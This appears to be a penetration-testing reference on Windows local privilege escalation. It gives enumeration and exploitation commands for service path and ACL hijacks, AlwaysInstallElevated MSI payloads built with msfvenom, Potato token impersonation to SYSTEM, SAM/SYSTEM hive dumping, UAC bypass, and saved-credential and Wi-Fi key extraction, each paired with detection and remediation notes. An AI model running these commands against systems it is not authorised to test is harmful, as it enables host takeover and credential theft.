# Windows Local Privilege Escalation — Reference

Low-priv user / service account → `NT AUTHORITY\SYSTEM` (or local Administrator) on a
standalone Windows host. **Enumerate first, prefer deterministic misconfiguration and
token paths, prove with `whoami /priv`, then stop.** LOLBAS
(<https://lolbas-project.github.io>) is the Windows "living-off-the-land" lookup, the
counterpart to GTFOBins.

Tooling: WinPEAS, PowerUp (`PowerSploit`), Seatbelt, SharpUp, `accesschk.exe`
(Sysinternals), and the Potato-family binaries. Prefer running enumerators from memory
and using benign proof payloads.

---

## 0. Enumeration

### HOW TO FIND — quick manual triage (do this first)
```cmd
whoami /all                    :: user SID, GROUPS, and PRIVILEGES (look for Se*Privilege Enabled)
whoami /priv                   :: the fast tell — SeImpersonate/SeAssignPrimaryToken/SeBackup/SeDebug?
systeminfo                     :: OS build + hotfixes (feeds exploit-suggester)
hostname & echo %USERNAME%
net user & net localgroup administrators
cmdkey /list                   :: saved credentials (runas /savecred candidates)
wmic qfe get HotFixID          :: patch level
```
```powershell
Get-LocalUser; Get-LocalGroupMember Administrators
Get-CimInstance Win32_Service | ? {$_.StartName -match 'LocalSystem'} | select Name,PathName,StartMode
```

### HOW TO FIND — automated coverage (read output; confirm manually)
```cmd
winPEASany.exe quiet           :: comprehensive (services, creds, registry, tokens)
Seatbelt.exe -group=all        :: host situational awareness
accesschk.exe /accepteula -uwcqv "Users" *   :: writable services/objects for a group
```
```powershell
Import-Module .\PowerUp.ps1; Invoke-AllChecks   :: ranked misconfig candidates
# Or SharpUp.exe audit    (C# port of PowerUp)
```
- **Detection (blue-team):** WinPEAS/PowerUp/Seatbelt/accesschk are heavily
  signatured — expect AMSI/EDR alerts; document that the tools ran. Monitor for
  `accesschk`, `sc query` sweeps, and PowerShell enumerating services/tokens.
- **Reference:** PEASS-ng WinPEAS; PowerSploit PowerUp; HackTricks "Windows Local
  Privilege Escalation" checklist (Sources).

---

## 1. Unquoted service paths

**HOW TO FIND**
```cmd
wmic service get Name,PathName,StartMode | findstr /i /v "C:\Windows\\" | findstr /i /v """
:: PathName like  C:\Program Files\My App\svc.exe  with a SPACE and NO quotes
```
```powershell
Invoke-AllChecks    # PowerUp flags "Unquoted Service Paths" and even writes the exploit for you
```
Exploitable only if you can **write** to an earlier path segment (e.g. `C:\Program.exe`
or `C:\Program Files\My.exe`) AND can restart the service.

**HOW TO EXPLOIT (safe)** — place a benign proof binary at the interposed path, restart
the service, confirm it runs as the service account, then remove it:
```cmd
:: For path C:\Program Files\My App\svc.exe -> Windows tries C:\Program.exe first
copy proof.exe "C:\Program Files\My.exe"       :: benign: adds a temp local admin OR spawns proof shell
sc stop <svc> & sc start <svc>                   :: or reboot if permitted
whoami /priv                                     :: (from the spawned context) prove, then delete My.exe
```
PowerUp: `Write-ServiceBinary`/`Invoke-ServiceAbuse` automate a minimal proof; clean up
after.
- **Reference:** PowerUp docs; HackTricks "Unquoted Service Path".
- **Detection:** service creating processes from unexpected paths; new EXE at
  `C:\Program.exe` etc. **Remediation:** quote all `ImagePath` values; restrict write
  perms on `C:\` and app dirs.

---

## 2. Weak service / registry ACLs, service-binary & PATH hijack

**HOW TO FIND**
```cmd
accesschk.exe /accepteula -uwcqv "Users" *          :: services writable by Users (SERVICE_ALL_ACCESS / _CHANGE_CONFIG)
accesschk.exe /accepteula -quvw "Authenticated Users" *
:: registry service perms:
accesschk.exe /accepteula -kvuqsw "Users" HKLM\System\CurrentControlSet\Services
```
```powershell
Invoke-AllChecks   # PowerUp: "Modifiable Services", "Modifiable Service Binaries"
```
Three sub-cases: (a) you can `sc config` the service (change `binPath`); (b) the service
**binary or its directory** is writable (overwrite the EXE); (c) the service registry
key is writable (edit `ImagePath`).

**HOW TO EXPLOIT (safe)**
```cmd
:: (a) reconfigurable service -> point binPath at a benign proof command, restart, restore
sc qc <svc>                                        :: record ORIGINAL binPath for cleanup
sc config <svc> binPath= "C:\Windows\Temp\proof.exe"
sc stop <svc> & sc start <svc>                     :: runs proof.exe as service account (often SYSTEM)
sc config <svc> binPath= "<ORIGINAL>"              :: RESTORE
```
For (b) writable binary: back up the original EXE, drop a benign proof EXE, restart,
restore. Keep payload benign (spawn proof shell / add temp account you will delete).
- **Reference:** PowerUp; HackTricks "Services".
- **Detection:** `sc config` changes to `binPath`; service EXE modified; service
  spawning cmd/powershell. **Remediation:** least-privilege service ACLs (remove
  `SERVICE_CHANGE_CONFIG`/write from Users); protect binaries and registry keys.

---

## 3. AlwaysInstallElevated

**HOW TO FIND** — both keys must be `1`:
```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```powershell
Invoke-AllChecks   # PowerUp flags "AlwaysInstallElevated"
```

**HOW TO EXPLOIT (safe)** — any MSI runs as SYSTEM. Build a **benign** MSI (e.g. spawn a
proof shell or add a temp admin you will remove), install, prove, uninstall/clean up:
```bash
# on attack box (keep the payload minimal/benign)
msfvenom -f msi -p windows/x64/exec CMD="cmd.exe /c whoami > C:\Windows\Temp\aie_proof.txt" -o proof.msi
```
```cmd
msiexec /quiet /qn /i proof.msi     :: runs as SYSTEM; read the proof file, then delete it
```
- **Reference:** HackTricks "AlwaysInstallElevated"; PowerUp `Write-UserAddMSI`.
- **Detection:** `msiexec` installing from user-writable paths under SYSTEM; the two
  policy keys set. **Remediation:** disable both `AlwaysInstallElevated` GPO settings.

---

## 4. DLL search-order / DLL hijacking

**HOW TO FIND** — a service/app (running elevated) that loads a **missing** DLL from a
**writable** directory, or has a writable dir earlier in its search order.
```powershell
Invoke-AllChecks           # PowerUp: "DLL Hijacking" candidates (writable %PATH% dirs)
# Use Process Monitor (procmon) filter: Result = NAME NOT FOUND, Path ends with .dll -> missing DLL loads
```

**HOW TO EXPLOIT (safe)** — compile a benign proxy/stub DLL that just writes a proof
marker (or spawns a proof shell) in `DllMain`, place it as the missing DLL name in the
writable dir, trigger the load, prove, then remove it.
- **Reference:** HackTricks "DLL Hijacking"; LOLBAS (for signed-binary side-loading).
- **Detection:** unusual DLL loaded from user-writable path by an elevated process;
  procmon `NAME NOT FOUND` patterns. **Remediation:** SafeDllSearchMode; fully-qualified
  DLL loads; remove writable dirs from privileged process paths; app allow-listing.

---

## 5. Token impersonation — SeImpersonate / SeAssignPrimaryToken → **Potato family**

The single most common service-account → SYSTEM path. If `whoami /priv` shows
**`SeImpersonatePrivilege`** (or `SeAssignPrimaryTokenPrivilege`) **Enabled** — typical
for IIS `iisapppool\*`, MSSQL service accounts, and many service contexts — you can
coerce a privileged process to authenticate to you and steal its token.

**HOW TO FIND**
```cmd
whoami /priv | findstr /i "SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```

**HOW TO EXPLOIT (safe — prove SYSTEM then stop)** — pick the tool by OS version:
- **PrintSpoofer** — named-pipe + Print Spooler coercion; works on Windows 10 / Server
  2016 / 2019 (and where the Spooler is reachable). Cleanest first choice:
  ```cmd
  PrintSpoofer64.exe -i -c "cmd /c whoami"     :: prints  nt authority\system  -> proof, stop
  ```
- **GodPotato** — works across Windows 8/8.1/10/11 and Server 2012–2022 via DCOM/RPC;
  the modern go-to when Spooler is disabled:
  ```cmd
  GodPotato-NET4.exe -cmd "cmd /c whoami"       :: -> nt authority\system
  ```
- **RoguePotato** — needs an OXID resolver redirect (port 135 to an attacker relay);
  use when the others are blocked.
- **JuicyPotato** — classic, but **does not work on Server 2019 / Win10 1809+** (BITS/DCOM
  CLSID path fixed). Use only on older builds.
- **SigmaPotato** (fork of GodPotato, maintained 2024–2025) — adds in-memory/.NET
  reflection execution and extended OS support.

Prove with `whoami` = `nt authority\system`, capture, **stop** — do not launch a
persistent SYSTEM shell or dump secrets beyond the RoE.
- **Reference:** HackTricks "RoguePotato/PrintSpoofer/GodPotato"; itm4n PrintSpoofer;
  BeichenDream GodPotato (Sources).
- **Detection:** anonymous/loopback named-pipe auth to SYSTEM; Spooler/DCOM coercion;
  service account spawning `cmd`/`powershell` as SYSTEM. **Remediation:** remove
  `SeImpersonate` from accounts that don't need it; disable Print Spooler where not
  needed; patch; monitor token-manipulation (Sysmon).

---

## 6. Privilege abuse — SeBackup / SeRestore / SeDebug / SeTakeOwnership

If `whoami /priv` shows these Enabled (common for Backup Operators, some service accts):

**HOW TO FIND** — `whoami /priv`.

**HOW TO EXPLOIT (safe, minimal)**
- **SeBackupPrivilege / SeRestorePrivilege** — read any file bypassing ACLs. Instead of
  dumping the live SAM, use it to copy the **SAM/SYSTEM hives** for offline hash
  extraction (evidence-minimal):
  ```cmd
  reg save HKLM\SAM  C:\Windows\Temp\sam.hiv
  reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
  :: OR via robocopy backup mode / diskshadow VSS for locked files
  ```
  Then `impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL` offline (see
  `password-cracking-credentials`). Recover minimal proof, delete the hive copies.
- **SeDebugPrivilege** — open/duplicate a SYSTEM process token (concept: dump LSASS or
  migrate). Prove access minimally; do not exfiltrate full LSASS on prod without RoE.
- **SeTakeOwnershipPrivilege** — take ownership of a protected object to gain access;
  record original owner and restore.
- **Reference:** HackTricks "Abusing Tokens / SeBackupPrivilege"; Impacket secretsdump.
- **Detection:** `reg save` of SAM/SYSTEM; VSS/diskshadow by unusual users; LSASS handle
  opens. **Remediation:** restrict these privileges to intended roles; Credential Guard;
  LSASS PPL.

---

## 7. UAC bypass (concept)

For a **medium-integrity local-admin** context, UAC bypasses elevate to high integrity
without a prompt. This is integrity elevation, not a new privilege set — relevant when
you're admin but need high-integrity for hive/LSASS access.

**HOW TO FIND** — `whoami /groups` shows Administrators but at **Medium** integrity;
`ConsentPromptBehaviorAdmin` in
`HKLM\...\Policies\System`.

**HOW TO EXPLOIT (concept / lab)** — auto-elevating binary + registry hijack techniques,
e.g. `fodhelper.exe` / `computerdefaults.exe` via
`HKCU\Software\Classes\ms-settings\shell\open\command`, or `eventvwr.exe` /
`sdclt.exe` hijacks (UACMe catalog). These write **user-hive registry keys** — record and
**delete them** after proving high-integrity. Treat as concept-level; many are
signatured/patched.
- **Reference:** hfiref0x/UACME; HackTricks "UAC bypass".
- **Detection:** `fodhelper`/`eventvwr` spawning cmd; `ms-settings`/`mscfile` HKCU class
  hijack keys. **Remediation:** UAC to "Always notify"; monitor known auto-elevate
  hijack keys; app allow-listing.

---

## 8. Autoruns / scheduled tasks

**HOW TO FIND**
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
```
```powershell
Get-ScheduledTask | ? {$_.Principal.UserId -match 'SYSTEM'} | select TaskName,TaskPath
Invoke-AllChecks   # PowerUp: writable autorun binaries / registry Run keys
accesschk.exe /accepteula -wvu "C:\Path\To\ScheduledBinary.exe"
```
Exploitable when a SYSTEM/admin task or `Run`/`RunOnce` key points at a **writable**
binary/script, or an autorun references a writable dir.

**HOW TO EXPLOIT (safe)** — back up the original, replace with a benign proof binary,
wait for/trigger the trigger, prove context, restore.
- **Reference:** PowerUp; HackTricks "Scheduled Tasks / Autoruns"; Sysinternals Autoruns.
- **Detection:** modified task binaries; new `Run`/`RunOnce` values; task spawning shells.
  **Remediation:** ACL task binaries and autorun paths; least-privilege task principals.

---

## 9. Credential hunting

Local privesc frequently comes from **stored credentials**, not a memory bug.

**HOW TO FIND**
```cmd
cmdkey /list                                             :: saved creds -> runas /savecred
reg query HKLM /f password /t REG_SZ /s                  :: registry secrets (noisy)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword  :: autologon
:: unattended-install / provisioning files:
dir /s /b C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\sysprep.inf 2>nul
:: Group Policy Preferences cpassword (AES key is public) in SYSVOL/local cache:
findstr /S /I cpassword %ALLUSERSPROFILE%\Microsoft\Group Policy\History\*.xml 2>nul
```
```powershell
Invoke-AllChecks   # PowerUp: unattend, GPP, registry autologon, cached creds
Seatbelt.exe -group=credentials
# App configs, KeePass/web.config, PuTTY sessions, WiFi PSKs:
netsh wlan show profile name="<SSID>" key=clear
```

**HOW TO EXPLOIT (safe)** — decode GPP `cpassword` (public AES key), decrypt saved
autologon, or `runas /savecred /user:ADMIN cmd`. Use recovered creds to authenticate as
the higher-priv account; do not spray or reuse out of scope. Mask all secrets in the
report; store minimally.
- **Reference:** HackTricks "Windows Credentials"; MS14-025 / GPP `cpassword`
  (CVE-2014-1812); PowerUp `Get-UnattendedInstallFile`, `Get-CachedGPPPassword`.
- **Detection:** access to unattend/GPP files; `cmdkey`/`runas /savecred` use; Winlogon
  autologon reads. **Remediation:** remove `cpassword` GPPs; delete unattend files
  post-install; no autologon passwords; use LAPS/Windows LAPS for local admin.

---

## 10. Kernel / missing-patch exploits — DETECT-ONLY by default

**HOW TO FIND**
```cmd
systeminfo    :: feed to a suggester
```
```powershell
# Watson (in-memory) / Sherlock / wesng map installed KBs -> known LPE CVEs
python wesng.py systeminfo.txt          # Windows Exploit Suggester - Next Gen
```
Treat suggester output as a **prioritized list of CVEs to report and patch** (e.g.
older HEVD/afd/CLFS/ALPC LPEs, PrintNightmare CVE-2021-34527). Kernel LPE exploits can
**BSOD** the host — run only in a lab / RoE-approved non-prod, snapshotted machine. On
prod, the missing-patch fingerprint **is** the finding.
- **Reference:** wesng; HackTricks Windows kernel exploits; MSRC advisories.
- **Detection:** exploitation crashes/BSODs; EDR kernel-callback alerts.
  **Remediation:** patch to current cumulative update; keep build current.

---

## Quick reference — decision order

1. `whoami /priv` → **SeImpersonate/SeAssignPrimaryToken** ⇒ **Potato** (PrintSpoofer/
   GodPotato). SeBackup/SeRestore/SeDebug ⇒ §6.
2. `Invoke-AllChecks` / WinPEAS → service ACL, unquoted path, AlwaysInstallElevated,
   DLL hijack, autorun (§1–4, §8) — deterministic, prefer these.
3. Credential hunting (§9) — often the quiet win.
4. UAC bypass (§7) only if already local admin at medium integrity.
5. Missing-patch/kernel CVEs (§10) — **detect & report**, exploit only in lab/RoE.

LOLBAS (`https://lolbas-project.github.io`) — signed built-in binaries for
execution/download/bypass, the Windows analogue of GTFOBins.
